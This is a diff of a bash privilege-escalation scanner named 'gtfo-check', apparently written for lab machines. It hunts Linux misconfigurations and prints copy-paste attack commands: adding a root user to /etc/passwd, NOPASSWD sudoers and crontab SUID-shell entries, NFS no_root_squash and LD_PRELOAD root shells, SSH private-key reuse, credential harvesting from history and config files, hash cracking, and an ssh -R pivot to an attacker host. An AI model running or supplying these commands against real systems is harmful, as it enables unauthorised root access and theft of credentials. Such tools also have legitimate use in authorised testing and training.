-            adm)     show_extra "Member of 'adm'" "Read logs — credential harvesting" "grep -rn 'pass\|pwd\|token\|key' /var/log/ 2>/dev/null" ;;
-            shadow)  show_extra "Member of 'shadow'" "Read /etc/shadow — crack hashes" "cat /etc/shadow\njohn --wordlist=rockyou.txt shadow.txt" ;;
-            video)   show_extra "Member of 'video'" "Capture framebuffer" "cat /dev/fb0 > screenshot.raw" ;;
-        esac
-    done
-fi
-
-# --- /etc/passwd and /etc/shadow misconfigs ---
-PW_HITS=false
-[ -w /etc/passwd ] && PW_HITS=true
-[ -r /etc/shadow ] && PW_HITS=true
-EMPTY_PW=$(awk -F: '($2 == "") {print $1}' /etc/passwd 2>/dev/null)
-[ -n "$EMPTY_PW" ] && PW_HITS=true
-HASH_IN_PASSWD=$(awk -F: '($2 != "x" && $2 != "*" && $2 != "!" && $2 != "!!" && $2 != "") {print $1 ":" $2}' /etc/passwd 2>/dev/null)
-[ -n "$HASH_IN_PASSWD" ] && PW_HITS=true
-
-if [ "$PW_HITS" = true ]; then
-    header "/etc/passwd & /etc/shadow"
-    [ -w /etc/passwd ] && show_extra "/etc/passwd is WRITABLE" "Add a root user" "echo 'hacker:\$6\$salt\$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
-    [ -r /etc/shadow ] && show_extra "/etc/shadow is READABLE" "Crack hashes offline" "cat /etc/shadow\njohn --wordlist=rockyou.txt shadow.txt"
-    [ -n "$EMPTY_PW" ] && show_extra "Users with empty password" "$EMPTY_PW" "su - $(echo "$EMPTY_PW" | head -1)"
-    [ -n "$HASH_IN_PASSWD" ] && show_extra "Hashes in /etc/passwd" "$HASH_IN_PASSWD" "# Crack with john or hashcat"
-fi
-
-# --- NFS no_root_squash ---
-if [ -r /etc/exports ] && grep -q "no_root_squash" /etc/exports 2>/dev/null; then
-    header "NFS no_root_squash"
-    grep "no_root_squash" /etc/exports 2>/dev/null | while IFS= read -r line; do
-        SHARE=$(echo "$line" | awk '{print $1}')
-        show_extra "no_root_squash: $SHARE" "$line" "# Attacker: mount -t nfs TARGET:$SHARE /mnt\n# cp /bin/bash /mnt/bash && chmod +s /mnt/bash\n# Target: /mnt/bash -p"
-    done
-fi
-
-# --- Writable systemd service files ---
-SVC_HITS=""
-for svcdir in /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system /run/systemd/system; do
-    [ -d "$svcdir" ] || continue
-    while IFS= read -r svc; do
-        [ -z "$svc" ] && continue
-        [ -w "$svc" ] && SVC_HITS="${SVC_HITS}${svc}\n"
-    done < <(find "$svcdir" -maxdepth 1 -name '*.service' -type f 2>/dev/null)
-done
-if [ -n "$SVC_HITS" ]; then
-    header "Writable Systemd Services"
-    echo -e "$SVC_HITS" | while IFS= read -r svc; do
-        [ -z "$svc" ] && continue
-        show_extra "Writable: $svc" "" "# Edit ExecStart, then: systemctl daemon-reload && systemctl restart $(basename "$svc")"
-    done
-fi
-
-# --- LD_PRELOAD / LD_LIBRARY_PATH ---
-LD_HITS=false
-echo "$SUDO_OUTPUT" | grep -qi "LD_PRELOAD\|env_keep.*LD" && LD_HITS=true
-[ -n "$LD_PRELOAD" ] && LD_HITS=true
-[ -n "$LD_LIBRARY_PATH" ] && LD_HITS=true
 if [ -r /etc/ld.so.conf ]; then
     while IFS= read -r libdir; do
-        [ -z "$libdir" ] && continue
-        echo "$libdir" | grep -q '^[#i]' && continue
-        [ -d "$libdir" ] && [ -w "$libdir" ] && LD_HITS=true
+        case "$libdir" in ''|'#'*|include*) continue ;; esac
+        [ -d "$libdir" ] && [ -w "$libdir" ] || continue
+        add_finding HIGH "Writable library path: $libdir" "Listed in /etc/ld.so.conf" \
+            "# Drop a malicious .so here, then: ldconfig"
     done < /etc/ld.so.conf
 fi
-if [ "$LD_HITS" = true ]; then
-    header "LD_PRELOAD / LD_LIBRARY_PATH"
-    echo "$SUDO_OUTPUT" | grep -qi "LD_PRELOAD\|env_keep.*LD" && \
-        show_extra "sudo preserves LD_PRELOAD" "Library injection via sudo" "# gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles\n# void _init() { setuid(0); system(\"/bin/sh\"); }\nsudo LD_PRELOAD=/tmp/pe.so <binary>"
-    [ -n "$LD_PRELOAD" ] && \
-        show_extra "LD_PRELOAD set" "Value: $LD_PRELOAD" "# Inspect loaded library"
-    [ -n "$LD_LIBRARY_PATH" ] && \
-        show_extra "LD_LIBRARY_PATH set" "Value: $LD_LIBRARY_PATH" "# Check for writable dirs — place malicious .so"
-    if [ -r /etc/ld.so.conf ]; then
-        while IFS= read -r libdir; do
-            [ -z "$libdir" ] && continue
-            echo "$libdir" | grep -q '^[#i]' && continue
-            [ -d "$libdir" ] && [ -w "$libdir" ] && \
-                show_extra "Writable lib path: $libdir" "In /etc/ld.so.conf" "# Place malicious .so, run ldconfig"
-        done < /etc/ld.so.conf
-    fi
-fi
 
-# --- Writable /etc files ---
-ETC_HITS=""
-for etcfile in /etc/passwd /etc/shadow /etc/sudoers /etc/crontab /etc/ssh/sshd_config \
-    /etc/ld.so.conf /etc/ld.so.preload /etc/environment /etc/profile /etc/bash.bashrc \
-    /etc/pam.d/common-auth /etc/pam.d/su /etc/security/access.conf /etc/login.defs \
+ETC_W=""
+for etcfile in /etc/sudoers /etc/crontab /etc/ssh/sshd_config /etc/ld.so.conf \
+    /etc/environment /etc/profile /etc/bash.bashrc /etc/pam.d/common-auth /etc/pam.d/su \
     /etc/fstab /etc/exports /etc/anacrontab /etc/logrotate.conf /etc/rsyslog.conf; do
-    [ -w "$etcfile" ] 2>/dev/null && ETC_HITS="${ETC_HITS}${etcfile}\n"
+    [ -w "$etcfile" ] 2>/dev/null || continue
+    case "$etcfile" in
+        /etc/sudoers) add_finding CRIT "/etc/sudoers is writable" "" \
+            "echo '$ME ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+sudo su -" ;;
+        /etc/crontab) add_finding CRIT "/etc/crontab is writable" "" \
+            "echo '* * * * * root cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /etc/crontab
+# wait a minute, then:
+/tmp/rootbash -p" ;;
+        *) ETC_W="${ETC_W}  ${etcfile}
+" ;;
+    esac
 done
-[ ! -f /etc/ld.so.preload ] && [ -w /etc/ ] 2>/dev/null && ETC_HITS="${ETC_HITS}CREATABLE:/etc/ld.so.preload\n"
-if [ -n "$ETC_HITS" ]; then
-    header "Writable /etc Files"
-    echo -e "$ETC_HITS" | while IFS= read -r etcfile; do
-        [ -z "$etcfile" ] && continue
-        case "$etcfile" in
-            CREATABLE:*)
-                show_extra "/etc/ writable — can create /etc/ld.so.preload" "Global library preload" "echo '/tmp/evil.so' > /etc/ld.so.preload"
-                ;;
-            *)
-                echo -e "  ${RED}✗${NC} ${BOLD}Writable:${NC} $etcfile"
-                FOUND=$((FOUND+1))
-                FOUND_EXTRA=$((FOUND_EXTRA+1))
-                ;;
-        esac
-    done
+[ -n "$ETC_W" ] && add_finding HIGH "Other writable /etc config files" "$ETC_W" \
+    "# Review what root reads from these"
 fi
 
-# --- Credential hunting (only actual finds) ---
-CRED_HEADER_SHOWN=false
-show_cred_header() {
-    if [ "$CRED_HEADER_SHOWN" = false ]; then
-        header "Credentials Found"
-        CRED_HEADER_SHOWN=true
-    fi
-}
+# =============================== NFS ===============================
+if [ -r /etc/exports ] && grep -q "no_root_squash" /etc/exports 2>/dev/null; then
+    SHARE=$(grep "no_root_squash" /etc/exports | grep -v '^\s*#' | awk '{print $1}' | head -1)
+    add_finding CRIT "NFS export with no_root_squash: $SHARE" \
+        "$(grep 'no_root_squash' /etc/exports | grep -v '^\s*#')" \
+        "# ---- on YOUR attacking box, as root ----
+mkdir -p /mnt/nfs
+mount -o rw,vers=3 $(hostname -I 2>/dev/null | awk '{print $1}'):$SHARE /mnt/nfs
+cp /bin/bash /mnt/nfs/rootbash
+chmod +s /mnt/nfs/rootbash
+# ---- back on the target ----
+$SHARE/rootbash -p"
+fi
+
+# ======================== WRITABLE FILES ===========================
+if [ "$IS_ROOT" -eq 0 ]; then
+    WRITABLE_CACHE=$(timeout 30 find /etc /opt /var /usr/local /srv /root -writable -type f ! -user "$ME" \
+        ! -path "/var/lib/*" ! -path "/var/cache/*" ! -path "/var/log/*" ! -path "/var/tmp/*" \
+        2>/dev/null | head -25)
+    [ -n "$WRITABLE_CACHE" ] && add_finding HIGH "Writable files owned by other users" \
+        "$(echo "$WRITABLE_CACHE" | cap_list 10)" ""
+fi
+
+# ========================= CREDENTIALS =============================
+CRED_RE='(password|passwd|pwd|secret|token|api[_-]?key|db_pass(word)?)[[:space:]]*[=:][[:space:]]*[^[:space:]#]'
+NOISE_RE='^[[:space:]]*(#|//|\*|;|--)|example|changeme|placeholder|your_|xxxx|\$\{|<%=|REPLACE'
 
 for cf in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.mysql_history" \
     "$HOME/.psql_history" "$HOME/.my.cnf" "/etc/shadow.bak" "/etc/passwd.bak" \
     "/etc/openvpn/auth.txt" "/etc/ppp/chap-secrets" "/etc/ppp/pap-secrets"; do
-    if [ -r "$cf" ] && [ -f "$cf" ] && [ -s "$cf" ]; then
-        show_cred_header
-        echo -e "  ${GREEN}✓${NC} Readable: $cf"
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
+    [ -r "$cf" ] && [ -f "$cf" ] && [ -s "$cf" ] || continue
+    HITS=$(grep -inE "$CRED_RE" "$cf" 2>/dev/null | grep -vEi "$NOISE_RE" | head -5)
+    if [ -n "$HITS" ]; then
+        add_finding HIGH "Credentials in $cf" "$(echo "$HITS" | sed 's/^/  /')" "cat $cf"
+    else
+        add_finding INFO "Readable history/secret file: $cf" "" "cat $cf"
     fi
 done
 
 for keydir in /home/*/.ssh /root/.ssh; do
     [ -d "$keydir" ] || continue
     for keyfile in "$keydir"/id_* "$keydir"/*key*; do
-        [ -f "$keyfile" ] || continue
-        echo "$keyfile" | grep -q '\.pub$' && continue
-        if [ -r "$keyfile" ]; then
-            show_cred_header
-            show_extra "SSH private key: $keyfile" "Owner: $(stat -c '%U:%G' "$keyfile" 2>/dev/null)" "ssh -i $keyfile user@target"
-        fi
+        [ -f "$keyfile" ] && [ -r "$keyfile" ] || continue
+        case "$keyfile" in *.pub) continue ;; esac
+        kuser=$(echo "$keyfile" | awk -F/ '{print $3}')
+        [ "$kuser" = ".ssh" ] && kuser=root
+        add_finding CRIT "Readable SSH private key: $keyfile" \
+            "Owner: $(stat -c '%U:%G' "$keyfile" 2>/dev/null)" \
+            "cp $keyfile /tmp/k && chmod 600 /tmp/k
+ssh -i /tmp/k $kuser@127.0.0.1"
     done
 done
 
-ENV_COUNT=0
+# config files with real credential values
 while IFS= read -r envfile; do
-    [ -z "$envfile" ] && continue
-    if grep -inE '(password|passwd|pwd|secret|token|api_key|apikey|db_pass)\s*[=:]\s*\S' "$envfile" 2>/dev/null | grep -vE '^\s*#|^\s*//|^\s*;|^\s*\*' | grep -q .; then
-        show_cred_header
-        echo -e "  ${GREEN}✓ Potential creds:${NC} $envfile"
-        grep -inE '(password|passwd|pwd|secret|token|api_key|apikey|db_pass)\s*[=:]\s*\S' "$envfile" 2>/dev/null | grep -vE '^\s*#|^\s*//|^\s*;|^\s*\*' | head -3 | while IFS= read -r match; do
-            echo -e "    $match"
-        done
-        ENV_COUNT=$((ENV_COUNT+1))
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
-    fi
-    [ "$ENV_COUNT" -ge 20 ] && break
-done < <(find /var/www /opt /srv /home /etc -maxdepth 3 \( -name '.env' -o -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' -o -name 'application.properties' \) -readable -type f 2>/dev/null)
+    [ -n "$envfile" ] || continue
+    HITS=$(grep -inE "$CRED_RE" "$envfile" 2>/dev/null | grep -vEi "$NOISE_RE" | head -4)
+    [ -n "$HITS" ] || continue
+    add_finding HIGH "Credentials in $envfile" "$(echo "$HITS" | sed 's/^/  /')" \
+        "cat $envfile"
+done < <(find /var/www /opt /srv /home /etc -maxdepth 4 \( \
+    -name '.env' -o -name 'wp-config.php' -o -name 'configuration.php' \
+    -o -name 'config.php' -o -name 'db.php' -o -name 'database.yml' \
+    -o -name 'settings.py' -o -name 'appsettings.json' -o -name 'application.properties' \
+    -o -name '*.cfg' -o -name '*.ini' \) -readable -type f 2>/dev/null | head -60)
 
-# --- Backup files & archives ---
-BACKUP_FILES=$(timeout 20 find /opt /srv /tmp /var/backups /backup /backups \
+if [ -r /var/lib/cloud/instance/user-data.txt ] && [ -s /var/lib/cloud/instance/user-data.txt ]; then
+    add_finding HIGH "Cloud-init user-data is readable" \
+        "$(grep -inE "$CRED_RE" /var/lib/cloud/instance/user-data.txt 2>/dev/null | head -5 | sed 's/^/  /')" \
+        "cat /var/lib/cloud/instance/user-data.txt"
+fi
+
+# ====================== BACKUPS / INTERESTING ======================
+BACKUPS=$(timeout 20 find /opt /srv /tmp /var/backups /backup /backups /home -maxdepth 4 \
     -type f -size +0c \( -name "*.zip" -o -name "*.tar*" -o -name "*.gz" -o -name "*.bz2" \
     -o -name "*.bak" -o -name "*.old" -o -name "*.backup" -o -name "*.sql" \
-    -o -name "*.db" -o -name "*.sqlite" -o -name "*.kdbx" \) -readable 2>/dev/null)
-if [ -n "$BACKUP_FILES" ]; then
-    header "Backup Files & Archives"
-    BACKUP_COUNT=0
+    -o -name "*.db" -o -name "*.sqlite" -o -name "*.kdbx" \) -readable 2>/dev/null | head -20)
+if [ -n "$BACKUPS" ]; then
+    DETAIL=""
     while IFS= read -r bf; do
-        [ -z "$bf" ] && continue
-        ftype=$(file -b "$bf" 2>/dev/null | cut -c1-60)
-        fsize=$(ls -lh "$bf" 2>/dev/null | awk '{print $5}')
-        echo -e "  ${GREEN}✓${NC} ${BOLD}$bf${NC}  ${YELLOW}($fsize)${NC}"
-        echo -e "    Type: ${CYAN}$ftype${NC}"
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
-        BACKUP_COUNT=$((BACKUP_COUNT+1))
-        [ "$BACKUP_COUNT" -ge 30 ] && echo -e "  ${YELLOW}... (max 30 shown)${NC}" && break
-    done <<< "$BACKUP_FILES"
-    echo -e "    ${CYAN}Suggestion:${NC} ${GREEN}unzip/tar xf interesting archives and grep for passwords${NC}"
+        [ -n "$bf" ] || continue
+        DETAIL="${DETAIL}  $bf  [$(ls -lh "$bf" 2>/dev/null | awk '{print $5}')]  $(file -b "$bf" 2>/dev/null | cut -c1-45)
+"
+    done <<< "$BACKUPS"
+    FIRST=$(echo "$BACKUPS" | head -1)
+    add_finding MED "Readable backup files / archives" \
+        "$(printf '%s' "$DETAIL" | sed 's/^  //' | cap_list 10)" \
+        "mkdir -p /tmp/ex && cd /tmp/ex
+# pick the right one:
+tar xf $FIRST    # or: unzip $FIRST
+grep -rniE 'passw|secret|token' /tmp/ex | head -20"
 fi
 
-# --- Web application config files ---
-WEBAPP_HEADER_SHOWN=false
-show_webapp_header() {
-    if [ "$WEBAPP_HEADER_SHOWN" = false ]; then
-        header "Web Application Config Files"
-        WEBAPP_HEADER_SHOWN=true
-    fi
-}
-while IFS= read -r wcf; do
-    [ -z "$wcf" ] && continue
-    CRED_LINES=$(grep -inE '(password|passwd|pwd|secret|db_pass|db_password|api_key|token)\s*[=:>\]]\s*\S' "$wcf" 2>/dev/null | grep -vE '^\s*#|^\s*//|^\s*;|^\s*\*|example|changeme|placeholder|your_' | head -5)
-    if [ -n "$CRED_LINES" ]; then
-        show_webapp_header
-        echo -e "  ${RED}✗${NC} ${BOLD}$wcf${NC}"
-        echo "$CRED_LINES" | while IFS= read -r cl; do
-            echo -e "    ${GREEN}$cl${NC}"
-        done
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
-    elif [ -r "$wcf" ]; then
-        show_webapp_header
-        echo -e "  ${GREEN}✓${NC} ${BOLD}$wcf${NC} (readable, no obvious creds found — check manually)"
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
-    fi
-done < <(find /var/www /opt /srv -type f \( \
-    -name "configuration.php" -o -name "wp-config.php" -o -name ".env" \
-    -o -name "config.php" -o -name "settings.py" -o -name "database.yml" \
-    -o -name "appsettings.json" -o -name "db.php" \
-    \) -readable 2>/dev/null)
+OTHER_HOME=$(timeout 15 find /home -readable -not -user "$ME" -type f \
+    -not -path "*/snap/*" -not -path "*/.cache/*" -not -path "*/.local/*" \
+    -not -path "*/.git/*" -not -path "*/node_modules/*" -not -name "*.sample" \
+    2>/dev/null | head -20)
+[ -n "$OTHER_HOME" ] && add_finding MED "Readable files in other users' home dirs" \
+    "$(echo "$OTHER_HOME" | cap_list 10)" ""
 
-# --- Other users' readable files ---
-OTHER_HOME_FILES=$(timeout 15 find /home -readable -not -user "$ME" \
-    -not -path "*/snap/*" -not -path "*/.cache/*" -type f 2>/dev/null | head -30)
-if [ -n "$OTHER_HOME_FILES" ]; then
-    header "Other Users' Readable Files"
-    while IFS= read -r ohf; do
-        [ -z "$ohf" ] && continue
-        echo -e "  ${GREEN}✓${NC} $ohf"
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
-    done <<< "$OTHER_HOME_FILES"
-fi
-
-# --- Cloud-init userdata ---
-if [ -r /var/lib/cloud/instance/user-data.txt ] && [ -s /var/lib/cloud/instance/user-data.txt ]; then
-    header "Cloud-init User Data"
-    echo -e "  ${RED}✗${NC} ${BOLD}/var/lib/cloud/instance/user-data.txt${NC} — Cloud VMs often store passwords here"
-    echo -e "  ${CYAN}[Contents]${NC}"
-    while IFS= read -r udline; do
-        echo -e "    $udline"
-    done < /var/lib/cloud/instance/user-data.txt
-    FOUND=$((FOUND+1))
-    FOUND_EXTRA=$((FOUND_EXTRA+1))
-fi
-
-# --- Non-default directories in /opt, /srv ---
-OPT_SRV_HEADER_SHOWN=false
+OPT_DIRS=""
 for ndd in /opt /srv; do
     [ -d "$ndd" ] || continue
     for subdir in "$ndd"/*/; do
         [ -d "$subdir" ] || continue
-        dir_contents=$(ls -A "$subdir" 2>/dev/null)
-        [ -z "$dir_contents" ] && continue
-        if [ "$OPT_SRV_HEADER_SHOWN" = false ]; then
-            header "Non-default Directories in /opt, /srv"
-            OPT_SRV_HEADER_SHOWN=true
-        fi
-        echo -e "  ${YELLOW}→${NC} ${BOLD}${subdir%/}${NC}"
-        ls -la "$subdir" 2>/dev/null | while IFS= read -r lsline; do
-            echo -e "    $lsline"
-        done
-        FOUND=$((FOUND+1))
-        FOUND_EXTRA=$((FOUND_EXTRA+1))
+        [ -n "$(ls -A "$subdir" 2>/dev/null)" ] || continue
+        OPT_DIRS="${OPT_DIRS}  ${subdir%/}  ($(ls -ld "$subdir" 2>/dev/null | awk '{print $1, $3":"$4}'))
+"
     done
 done
-[ "$OPT_SRV_HEADER_SHOWN" = true ] && echo -e "    ${CYAN}Suggestion:${NC} ${GREEN}Enumerate contents — lab creators hide creds/tools/backups here${NC}"
+[ -n "$OPT_DIRS" ] && add_finding INFO "Non-default directories in /opt, /srv" \
+    "$(printf '%s' "$OPT_DIRS" | sed 's/^  //' | cap_list 8)" \
+    "ls -la /opt /srv 2>/dev/null"
 
-# --- Recently modified files ---
-RECENT_FILES=$(timeout 20 find / -mmin -4320 -type f \
-    -not -path "/proc/*" -not -path "/sys/*" -not -path "/run/*" \
-    -not -path "/snap/*" -not -path "/var/log/*" -not -path "/usr/src/*" \
-    -not -path "/usr/share/*" -not -path "/usr/lib/*" -not -path "/var/lib/dpkg/*" \
-    -not -path "/var/lib/apt/*" -not -path "/tmp/.font-unix/*" -not -path "/dev/*" \
-    2>/dev/null | head -20)
-if [ -n "$RECENT_FILES" ]; then
-    header "Recently Modified Files (last 3 days)"
-    while IFS= read -r rf; do
-        [ -z "$rf" ] && continue
-        rf_info=$(ls -la "$rf" 2>/dev/null | awk '{print $1, $3, $4, $6, $7, $8}')
-        echo -e "  ${YELLOW}→${NC} ${BOLD}$rf${NC}"
-        echo -e "    $rf_info"
-    done <<< "$RECENT_FILES"
-    echo -e "    ${CYAN}Suggestion:${NC} ${GREEN}Lab makers leave traces — check these for creds or misconfigs${NC}"
+# ======================= INTERNAL SERVICES =========================
+if command -v ss &>/dev/null; then
+    LOCAL_PORTS=$(ss -tlnH 2>/dev/null | awk '{print $4}' \
+        | grep -E '^(127\.0\.0\.1|\[::1\]|localhost)' | sed 's/.*://' | sort -un)
+    for port in $LOCAL_PORTS; do
+        [ -n "$port" ] || continue
+        case "$port" in
+            3306) add_finding MED "MySQL on 127.0.0.1:3306 (internal only)" \
+                "Often root/no password on lab boxes" \
+                "mysql -u root -h 127.0.0.1 -P 3306
+# if that works:
+mysql -u root -h 127.0.0.1 -e 'select user,host,authentication_string from mysql.user;'" ;;
+            5432) add_finding MED "PostgreSQL on 127.0.0.1:5432 (internal only)" "" \
+                "psql -h 127.0.0.1 -U postgres
+# then:  \\! /bin/sh" ;;
+            6379) add_finding HIGH "Redis on 127.0.0.1:6379 (internal only)" \
+                "Usually unauthenticated — can write files as the redis user" \
+                "redis-cli -h 127.0.0.1
+INFO
+CONFIG GET dir" ;;
+            27017) add_finding MED "MongoDB on 127.0.0.1:27017 (internal only)" "" \
+                "mongo 127.0.0.1:27017
+show dbs" ;;
+            11211) add_finding MED "Memcached on 127.0.0.1:11211 (internal only)" "" \
+                "printf 'stats\r\n' | nc 127.0.0.1 11211" ;;
+            9200) add_finding MED "Elasticsearch on 127.0.0.1:9200 (internal only)" "" \
+                "curl -s http://127.0.0.1:9200/_cat/indices" ;;
+            8080|8443|8000|8888|5000|3000) add_finding MED "HTTP service on 127.0.0.1:$port (internal only)" \
+                "Not reachable externally — pivot through it" \
+                "curl -si http://127.0.0.1:$port/ | head -30
+# port-forward to your box:
+ssh -R $port:127.0.0.1:$port user@$LHOST" ;;
+            22|25|53|631|5939) : ;;
+            *) add_finding INFO "Unidentified internal service on 127.0.0.1:$port" "" \
+                "curl -si http://127.0.0.1:$port/ | head -20" ;;
+        esac
+    done
 fi
 
-# --- Internal services (localhost only) ---
-if command -v ss &>/dev/null; then
-    LOCALHOST_SVCS=$(ss -tlnp 2>/dev/null | grep -E '127\.0\.0\.1|::1' | grep -v '^State')
-    if [ -n "$LOCALHOST_SVCS" ]; then
-        header "Internal Services (localhost only)"
-        while IFS= read -r lsvc; do
-            [ -z "$lsvc" ] && continue
-            port=$(echo "$lsvc" | grep -oP ':(\d+)\s' | tr -d ': ' | head -1)
-            svc_hint=""
-            case "$port" in
-                3306) svc_hint="MySQL — try: mysql -u root -h 127.0.0.1" ;;
-                5432) svc_hint="PostgreSQL — try: psql -U postgres -h 127.0.0.1" ;;
-                6379) svc_hint="Redis — try: redis-cli -h 127.0.0.1" ;;
-                27017) svc_hint="MongoDB — try: mongo 127.0.0.1" ;;
-                11211) svc_hint="Memcached — try: echo 'stats' | nc 127.0.0.1 11211" ;;
-                9200) svc_hint="Elasticsearch — try: curl http://127.0.0.1:9200" ;;
-                8080|8443|8000|8888) svc_hint="Web service — try: curl http://127.0.0.1:$port" ;;
-                5000) svc_hint="Dev server — try: curl http://127.0.0.1:5000" ;;
-            esac
-            if [ -n "$svc_hint" ]; then
-                echo -e "  ${RED}✗${NC} Port ${BOLD}$port${NC} — ${YELLOW}$svc_hint${NC}"
-            else
-                echo -e "  ${YELLOW}→${NC} Port ${BOLD}$port${NC} — unknown service"
-            fi
-            echo -e "    $lsvc"
-            FOUND=$((FOUND+1))
-            FOUND_EXTRA=$((FOUND_EXTRA+1))
-        done <<< "$LOCALHOST_SVCS"
-        echo -e "    ${CYAN}Suggestion:${NC} ${GREEN}Internal services often run without auth or with default creds${NC}"
+# ======================= RECENTLY MODIFIED =========================
+RECENT=$(timeout 20 find /opt /srv /home /var/www /usr/local /tmp -mmin -4320 -type f \
+    -not -path "*/.cache/*" -not -path "*/.git/*" -not -path "*/node_modules/*" \
+    2>/dev/null | head -15)
+[ -n "$RECENT" ] && add_finding INFO "Recently modified files (last 3 days)" \
+    "$(echo "$RECENT" | cap_list 10)" ""
+
+# ============================= REPORT ==============================
+TOTAL=$(wc -l < "$FINDINGS" 2>/dev/null | tr -d ' ')
+[ -z "$TOTAL" ] && TOTAL=0
+
+echo ""
+echo -e "${BOLD}${CYAN}╔══════════════════════════════════════════════════════╗${NC}"
+echo -e "${BOLD}${CYAN}║  gtfo-check — privilege escalation report            ║${NC}"
+echo -e "${BOLD}${CYAN}╚══════════════════════════════════════════════════════╝${NC}"
+echo -e "  user: ${BOLD}${ME}${NC}   host: $(hostname 2>/dev/null)   findings: ${BOLD}${TOTAL}${NC}"
+[ "$IS_ROOT" -eq 1 ] && echo -e "  ${YELLOW}already uid 0 — writable-path checks skipped, looting only${NC}"
+
+if [ "$TOTAL" -eq 0 ]; then
+    echo ""
+    echo -e "  ${YELLOW}No privilege escalation vectors found.${NC}"
+    echo -e "  Try: ${CYAN}-v${NC} for recon context, or check kernel exploits manually."
+    echo ""
+    exit 0
+fi
+
+LAST_SEV=""
+IDX=0
+while IFS='|' read -r n sev t64 d64 c64; do
+    [ -z "$sev" ] && continue
+    title=$(_unb64 "$t64"); detail=$(_unb64 "$d64"); cmds=$(_unb64 "$c64")
+    if [ "$sev" != "$LAST_SEV" ]; then
+        case "$sev" in
+            CRIT) header "${RED}CRITICAL — instant root${NC}" ;;
+            HIGH) header "${YELLOW}HIGH — likely root with one more step${NC}" ;;
+            MED)  header "${CYAN}MEDIUM — lateral movement / credential access${NC}" ;;
+            INFO) header "INFO — context worth a look" ;;
+        esac
+        LAST_SEV="$sev"
     fi
+    IDX=$((IDX+1))
+    case "$sev" in
+        CRIT) MARK="${RED}✗${NC}" ;;
+        HIGH) MARK="${YELLOW}✗${NC}" ;;
+        *)    MARK="${GREEN}✓${NC}" ;;
+    esac
+    echo ""
+    # %b for color vars (they hold literal \033), %s for content so that
+    # backslashes in commands survive verbatim.
+    printf '  %b %b[%s] %s%b\n' "$MARK" "$BOLD" "$IDX" "$title" "$NC"
+    [ -n "$detail" ] && printf '%s\n' "$detail" | while IFS= read -r dl; do
+        printf '    %b%s%b\n' "$CYAN" "$dl" "$NC"
+    done
+    if [ -n "$cmds" ]; then
+        printf '%s\n' "$cmds" | while IFS= read -r cl; do
+            printf '      %b$ %s%b\n' "$GREEN" "$cl" "$NC"
+        done
+    fi
+done < <(sort -t'|' -k1,1n -k3,3 "$FINDINGS")
+
+# ---------------- copy-paste block: commands only ----------------
+HAS_CMDS=$(while IFS='|' read -r n sev t64 d64 c64; do
+    [ -n "$(_unb64 "$c64")" ] && echo x
+done < <(sort -t'|' -k1,1n "$FINDINGS") | head -1)
+
+if [ -n "$HAS_CMDS" ]; then
+    echo ""
+    echo -e "${BOLD}${CYAN}━━━ COPY-PASTE ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo ""
+    IDX=0
+    while IFS='|' read -r n sev t64 d64 c64; do
+        cmds=$(_unb64 "$c64")
+        [ -n "$cmds" ] || continue
+        IDX=$((IDX+1))
+        printf '# [%s] %s\n' "$sev" "$(_unb64 "$t64")"
+        printf '%s\n\n' "$cmds"
+    done < <(sort -t'|' -k1,1n "$FINDINGS")
 fi
 
-# ==============================================================================
-# RECON INFO (useful context, not direct exploits)
-# ==============================================================================
+# ============================== RECON ==============================
+if [ "$VERBOSE" -eq 1 ]; then
+    header "RECON (verbose)"
+    echo -e "  ${BOLD}Kernel:${NC} $(uname -a 2>/dev/null)"
+    echo -e "  ${BOLD}Distro:${NC} $(grep -h PRETTY_NAME /etc/*release 2>/dev/null | head -1 | cut -d= -f2- | tr -d '"')"
+    echo -e "  ${BOLD}id:${NC} $(id 2>/dev/null)"
+
+    echo -e "\n  ${BOLD}All listening sockets:${NC}"
+    (ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null) | sed 's/^/    /'
+
+    if [ -n "$CAP_OUTPUT" ]; then
+        echo -e "\n  ${BOLD}All capabilities:${NC}"
+        echo "$CAP_OUTPUT" | sed 's/^/    /'
+    fi
+
+    echo -e "\n  ${BOLD}Root processes:${NC}"
+    ps aux 2>/dev/null | awk '$1=="root"' \
+        | grep -vE '\[.*\]|/sbin/init|systemd$|systemd-|/lib/systemd' | head -15 | sed 's/^/    /'
+
+    echo -e "\n  ${BOLD}Mounts without nosuid:${NC}"
+    mount 2>/dev/null | grep -vE 'proc|sysfs|devpts|tmpfs|cgroup|securityfs|debugfs|mqueue|hugetlb|pstore|bpf|fusectl|configfs|devtmpfs|tracefs' \
+        | grep -v nosuid | sed 's/^/    /'
+
+    echo -e "\n  ${BOLD}SUID inventory (incl. defaults):${NC}"
+    echo "$SUID_CACHE" | awk '{print "    "$1"  "$3":"$4"  "$NF}'
+fi
+
+# ============================= SUMMARY =============================
+C_CRIT=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^CRIT$')
+C_HIGH=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^HIGH$')
+C_MED=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^MED$')
+C_INFO=$(cut -d'|' -f2 "$FINDINGS" | grep -c '^INFO$')
+
 echo ""
-echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════${NC}"
-echo -e "${BOLD}${CYAN}  RECON — useful context for manual investigation${NC}"
-echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════════${NC}"
-
-# --- Kernel ---
-echo -e "\n  ${BOLD}Kernel:${NC} $(uname -a 2>/dev/null)"
-
-# --- Listening services ---
